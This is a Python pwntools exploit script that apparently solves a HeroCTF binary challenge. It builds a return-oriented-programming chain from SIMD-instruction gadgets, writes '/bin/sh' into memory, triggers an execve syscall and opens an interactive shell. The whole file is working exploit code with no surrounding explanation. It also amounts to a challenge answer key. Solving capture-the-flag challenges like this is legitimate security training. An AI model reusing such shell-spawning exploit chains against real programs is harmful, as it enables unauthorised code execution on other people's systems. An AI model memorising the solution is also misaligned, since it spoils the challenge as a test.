from pwn import *

elf = context.binary = ELF("./unknown")

# r = remote("static-03.heroctf.fr", 5003)
r = process(elf.path)

# Gadgets
pcmpistrm_rax       = 0x401090
pmaddwd_bin_sh      = 0x4010F5
pext_bss_address    = 0x401196
vpextrq_bss_write   = 0x4011A9
xchg_rdi            = 0x4011B0
cdq_rdx_syscall     = 0x4010E2

# Fake argv**
rop = p64(elf.sym['unknown'])
rop += p64(0)

# end of buffer
rop += b'A' * 16

# rbp save
rop += b'B' * 8

# set RAX=0x3b
rop += p64(pcmpistrm_rax)
rop += p64(0x9a86a0a0a090a0a0)
rop += p64(0xdfd18c94919e97ab)

# set XMM0="/bin/sh\x00"
rop += p64(pmaddwd_bin_sh)
rop += p64(0x002d00040001000a)
rop += p64(0x001400070001000a)
rop += p64(0x00020002000a000a)
rop += p64(0x000200010005000a)
rop += p64(0x0016000500000000)
rop += p64(0x0014000100320002)
rop += p64(0x0005000100000000)
rop += p64(0x0002000700020002)

# set r11=unknown (address of "/bin/sh\x00")
rop += p64(pext_bss_address)
rop += p64(0xd0a296f1d08c0900)

# Store xmm0 ("/bin/sh") in [r11]
rop += p64(vpextrq_bss_write)

# set RDI=R11 (=unknown, address of "/bin/sh\x00")
rop += p64(xchg_rdi)

# set RDX=0 + syscall
rop += p64(cdq_rdx_syscall)

r.recvuntil(b"Hello. Input please: ")
# pause()

log.success(f"ROP length: {len(rop)}")
r.sendline(rop)
r.interactive()
